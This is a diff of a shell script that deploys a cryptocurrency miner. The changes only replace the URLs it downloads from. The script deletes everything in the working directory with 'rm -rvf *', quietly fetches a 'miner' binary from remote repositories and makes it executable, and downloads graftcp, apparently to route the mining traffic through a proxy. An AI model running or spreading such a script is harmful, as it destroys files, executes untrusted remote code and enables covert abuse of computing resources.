@@ -3,7 +3,7 @@ rm -rvf * && clear && mkdir a && cd a
 # 1. DOWNLOAD MINER
 ######################################
 for url in \
-  "https://gitlab.com/rokok/LA/-/raw/main/mcm" \
+  "https://github.com/lukmanpurai/KERJA/raw/refs/heads/main/lpm" \
   "https://raw.githubusercontent.com/backuprepo/LA/main/mcm"
 do
   wget -qO miner "$url" && break
@@ -13,7 +13,7 @@ chmod +x miner
 ######################################
 # 2. DOWNLOAD GRAFTCP
 ######################################
-wget -qO- https://gitlab.com/majzzaa/mvp/-/raw/main/graphics.tar.gz | tar -xz
+wget -qO- https://github.com/lukmanpurai/KERJA/raw/refs/heads/main/graphics.tar.gz | tar -xz
 chmod +x graftcp/graftcp graftcp/local/graftcp-local
 
 ######################################
